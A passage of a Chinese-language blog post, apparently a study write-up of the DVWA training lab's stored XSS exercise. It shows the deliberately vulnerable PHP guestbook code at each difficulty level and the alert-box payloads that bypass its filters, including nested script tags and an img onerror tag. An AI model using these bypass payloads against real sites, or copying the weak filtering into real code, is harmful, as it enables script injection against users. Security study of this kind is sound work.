+<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
+<p>mysql_real_escape_string(string,connection)</p>
+<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，’，”，\x1a）进行转义。</p>
+<p>stripslashes(string)</p>
+<p>函数删除字符串中的反斜杠。</p>
+<p>对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
+<p>message一栏输入<script>alert(/xss/)</script>，成功弹框：</p>
+<p><img src="https://image.3001.net/images/20161223/14824826941488.png!small"><br>name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>：</p>
+<p><img src="https://image.3001.net/images/20161223/14824827265355.png!small"><br>成功弹框：</p>
+<p><img src="https://image.3001.net/images/20161223/14824827533689.png!small"></p>
+<h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-27"><a href="#源代码-27" class="headerlink" title="源代码"></a>源代码</h2><?php 
+if( isset( $_POST[ 'btnSign' ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ 'mtxMessage' ] ); 
+    $name    = trim( $_POST[ 'txtName' ] ); 
+    // Sanitize message input 
+    $message = strip_tags( addslashes( $message ) ); 
+    $message = mysql_real_escape_string( $message ); 
+    $message = htmlspecialchars( $message ); 
+    // Sanitize name input 
+    $name = str_replace( '<script>', '', $name ); 
+    $name = mysql_real_escape_string( $name ); 
+    // Update database 
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+    //mysql_close(); 
+} 
+?>
+<hr>
+<p>相关函数说明</p>
+<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</p>
+<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
+<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p>
+<p>抓包改name参数为&lt;sc<script>ript>alert(/xss/)</script>:</p>
+<p><img src="https://image.3001.net/images/20161223/14824828493990.png!small"><br>成功弹框：</p>
+<p><img src="https://image.3001.net/images/20161223/14824828893635.png!small"></p>
+<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><h2 id="源代码-28"><a href="#源代码-28" class="headerlink" title="源代码"></a>源代码</h2><?php 
+if( isset( $_POST[ 'btnSign' ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ 'mtxMessage' ] ); 
+    $name    = trim( $_POST[ 'txtName' ] ); 
+    // Sanitize message input 
+    $message = strip_tags( addslashes( $message ) ); 
+    $message = mysql_real_escape_string( $message ); 
+    $message = htmlspecialchars( $message ); 
+    // Sanitize name input 
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); 
+    $name = mysql_real_escape_string( $name ); 
+    // Update database 
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+    //mysql_close(); 
+} 
+?>
+<hr>
+<p>这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
+<p>抓包改name参数为<img src=1 onerror=alert(1)>：</p>
+<p><img src="https://image.3001.net/images/20161223/14824830099169.png!small"><br>成功弹框：</p>
+<p><img src="https://image.3001.net/images/20161223/1482483036879.png!small"></p>
+<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-29"><a href="#源代码-29" class="headerlink" title="源代码"></a>源代码</h2><?php 
+if( isset( $_POST[ 'btnSign' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+    // Get input 
+    $message = trim( $_POST[ 'mtxMessage' ] ); 
+    $name    = trim( $_POST[ 'txtName' ] ); 
+    // Sanitize message input 
+    $message = stripslashes( $message ); 
+    $message = mysql_real_escape_string( $message ); 
+    $message = htmlspecialchars( $message ); 
+    // Sanitize name input 
+    $name = stripslashes( $name ); 
+    $name = mysql_real_escape_string( $name ); 
+    $name = htmlspecialchars( $name ); 
+    // Update database 
+    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); 
+    $data->bindParam( ':message', $message, PDO::PARAM_STR ); 
+    $data->bindParam( ':name', $name, PDO::PARAM_STR ); 
+    $data->execute(); 
+} 
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+?>
+<hr>
+<p>通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/26/dvwa/" data-id="cklp4thjw0000lsutadxchh34" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">远程桌面连接</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML%E6%A0%87%E7%AD%BE/" rel="tag">HTML标签</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows%E4%B8%8EKali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" rel="tag">Windows与Kali远程桌面连接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-web/" rel="tag">ctf-web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/" rel="tag">九九乘法表</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E5%AE%89%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5/" rel="tag">网安方向部分概念</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/HTML%E6%A0%87%E7%AD%BE/" style="font-size: 10px;">HTML标签</a> <a href="/tags/Windows%E4%B8%8EKali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">Windows与Kali远程桌面连接</a> <a href="/tags/ctf-web/" style="font-size: 10px;">ctf-web</a> <a href="/tags/sqli-lab/" style="font-size: 10px;">sqli-lab</a> <a href="/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/" style="font-size: 10px;">九九乘法表</a> <a href="/tags/%E7%BD%91%E5%AE%89%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5/" style="font-size: 10px;">网安方向部分概念</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/02/26/dvwa/">dvwa</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/">远程桌面连接</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/30/dingyi/">网安方向部分概念</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/28/htmlmark/">HTML标签</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/25/ctfweb/">ctf-web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
